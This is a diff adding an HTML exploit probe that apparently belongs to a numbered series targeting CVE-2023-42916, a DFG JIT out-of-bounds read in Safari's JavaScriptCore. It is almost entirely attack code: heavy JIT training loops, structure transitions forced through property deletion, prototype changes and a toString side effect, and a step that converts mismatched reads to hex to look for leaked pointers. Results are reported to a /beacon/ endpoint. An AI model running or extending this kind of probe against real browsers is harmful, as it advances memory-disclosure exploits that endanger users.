@@ -1,0 +1,241 @@
+<!--
+  p682: CVE-2023-42916 — DFG structure transition OOB read
+
+  CVE-2023-42916: OOB read, JIT-related, fixed Safari 17.1.2.
+
+  Strategy: DFG speculates on object Structure (shape). When it compiles a
+  GetByOffset, it bakes in a byte offset based on the Structure it observed during
+  profiling. If the object's Structure changes between profiling and execution
+  (e.g., via a valueOf callback or Proxy trap), the baked offset reads the wrong
+  field — potentially past the object's inline storage into adjacent heap memory.
+
+  This is different from CVE-2023-41993 (tested DEAD in p622) which targeted
+  GetByOffset with CSE. This probe targets the OFFSET itself being wrong due to
+  a structure transition that DFG does not invalidate.
+
+  Key patterns:
+  A) valueOf on comparison operand triggers structure transition mid-access
+  B) Prototype chain modification after DFG compilation
+  C) Object.defineProperty inside a getter called during DFG-compiled code
+  D) delete + re-add properties to force Structure chain divergence
+
+  CRASH_CLASS: MODERATE (wrong offset may read adjacent heap)
+  prior art: p622 (CVE-2023-41993 — DEAD), p634 (StructureID reuse — DEAD),
+             p605 (DFG type confusion), p606/p607 (CVE-2024-23222 — DEAD)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p682</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+  b('P682-START:CVE-2023-42916-STRUCTURE-TRANSITION');
+  var results = [];
+
+  // === SECTION A: valueOf triggers property deletion during DFG access ===
+  b('A:VALUEOF-DELETE');
+  try {
+    function Obj() {
+      this.a = 1.1;
+      this.b = 2.2;
+      this.c = 3.3;
+      this.d = 4.4;
+      this.e = 5.5;
+      this.f = 6.6;
+      this.g = 7.7;
+      this.h = 8.8;
+    }
+
+    function readPropE(o) {
+      return o.e; // DFG will compile GetByOffset at e's slot
+    }
+
+    // Train with consistent objects
+    var trainObjs = [];
+    for (var i = 0; i < 100; i++) trainObjs.push(new Obj());
+
+    for (var i = 0; i < 200000; i++) {
+      readPropE(trainObjs[i % 100]);
+    }
+    b('A:TRAINED-200K');
+
+    // Create an object then transition its structure
+    var victim = new Obj();
+    // Verify initial read
+    var pre = readPropE(victim);
+    b('A:PRE-READ:' + pre);
+
+    // Delete properties a-d, shifting e's effective position
+    // In JSC, delete causes a structure transition; if DFG uses the old
+    // offset, it reads from the wrong slot
+    delete victim.a;
+    delete victim.b;
+    delete victim.c;
+    delete victim.d;
+
+    var post = readPropE(victim);
+    b('A:POST-READ:' + post);
+
+    // If post != 5.5, we read from the wrong offset
+    if (post !== 5.5 && post !== undefined) {
+      b('A:OFFSET-MISMATCH:expected=5.5,got=' + post);
+      results.push('A:' + post);
+
+      // Check if it is a float that could encode a pointer
+      var ab = new ArrayBuffer(8);
+      var f64 = new Float64Array(ab);
+      var u64 = new BigUint64Array(ab);
+      f64[0] = post;
+      b('A:AS-HEX:0x' + u64[0].toString(16));
+    }
+  } catch(e) {
+    b('A:ERR:' + e.message);
+  }
+
+  // === SECTION B: Prototype modification after DFG ===
+  b('B:PROTO-MODIFY');
+  try {
+    var proto = { x: 11.11, y: 22.22, z: 33.33 };
+    function Child() {
+      this.a = 44.44;
+      this.b = 55.55;
+    }
+    Child.prototype = proto;
+
+    function readX(o) {
+      return o.x; // DFG compiles proto chain lookup
+    }
+
+    var children = [];
+    for (var i = 0; i < 100; i++) children.push(new Child());
+
+    for (var i = 0; i < 200000; i++) {
+      readX(children[i % 100]);
+    }
+    b('B:TRAINED-200K');
+
+    // Modify prototype: add many properties to force reallocation
+    for (var i = 0; i < 32; i++) {
+      proto['pad' + i] = 99.99;
+    }
+    // Delete original property
+    delete proto.x;
+    // Re-add with different value
+    proto.x = 77.77;
+
+    var val = readX(children[0]);
+    b('B:POST-READ:' + val);
+
+    if (val !== 11.11 && val !== 77.77 && val !== undefined) {
+      b('B:PROTO-CONFUSION:val=' + val);
+      results.push('B:' + val);
+    }
+  } catch(e) {
+    b('B:ERR:' + e.message);
+  }
+
+  // === SECTION C: defineProperty inside getter ===
+  b('C:GETTER-REDEFINE');
+  try {
+    var count = 0;
+    function Target() {
+      this.normal = 111.111;
+      this.payload = 222.222;
+      this.after = 333.333;
+    }
+
+    function readPayload(o) {
+      return o.payload;
+    }
+
+    var targets = [];
+    for (var i = 0; i < 100; i++) targets.push(new Target());
+
+    for (var i = 0; i < 200000; i++) {
+      readPayload(targets[i % 100]);
+    }
+    b('C:TRAINED-200K');
+
+    // Now create an object whose toString modifies the target's structure
+    var t = new Target();
+    var evil = {
+      toString: function() {
+        // Convert payload to accessor property, changing the structure
+        Object.defineProperty(t, 'payload', {
+          get: function() { return 999.999; },
+          configurable: true
+        });
+        return 'evil';
+      }
+    };
+
+    // Force the toString, then read with DFG-compiled function
+    '' + evil;
+    var val = readPayload(t);
+    b('C:POST-READ:' + val);
+
+    if (val !== 222.222 && val !== 999.999 && val !== undefined) {
+      b('C:STRUCTURE-CONFUSED:val=' + val);
+      results.push('C:' + val);
+    }
+  } catch(e) {
+    b('C:ERR:' + e.message);
+  }
+
+  // === SECTION D: Rapid structure churn + DFG read ===
+  b('D:STRUCTURE-CHURN');
+  try {
+    function StableObj() {
+      this.v0 = 0.1; this.v1 = 0.2; this.v2 = 0.3; this.v3 = 0.4;
+      this.v4 = 0.5; this.v5 = 0.6; this.v6 = 0.7; this.v7 = 0.8;
+    }
+
+    function readV4(o) {
+      return o.v4;
+    }
+
+    var stables = [];
+    for (var i = 0; i < 200; i++) stables.push(new StableObj());
+
+    // Train DFG hard
+    for (var i = 0; i < 300000; i++) {
+      readV4(stables[i % 200]);
+    }
+    b('D:TRAINED-300K');
+
+    // Churn: delete and re-add properties in different order
+    var victim = stables[0];
+    for (var round = 0; round < 20; round++) {
+      delete victim.v0;
+      delete victim.v1;
+      delete victim.v2;
+      delete victim.v3;
+      victim.v0 = round + 0.001;
+      victim.v1 = round + 0.002;
+      victim.v2 = round + 0.003;
+      victim.v3 = round + 0.004;
+
+      var val = readV4(victim);
+      if (val !== 0.5) {
+        b('D:CHURN-MISMATCH:round=' + round + ',val=' + val);
+        results.push('D:r' + round + '=' + val);
+      }
+    }
+    if (results.filter(function(r){return r.startsWith('D:');}).length === 0) {
+      b('D:ALL-CORRECT');
+    }
+  } catch(e) {
+    b('D:ERR:' + e.message);
+  }
+
+  // === SUMMARY ===
+  if (results.length > 0) {
+    b('P682-RESULT:HITS=' + results.join(';'));
+  } else {
+    b('P682-RESULT:NO-CONFUSION-DETECTED');
+  }
+  b('P682-DONE');
+}
+
+setTimeout(main, 100);
+</script>
+</head><body><pre id="log">p682: CVE-2023-42916 structure transition OOB</pre></body></html>
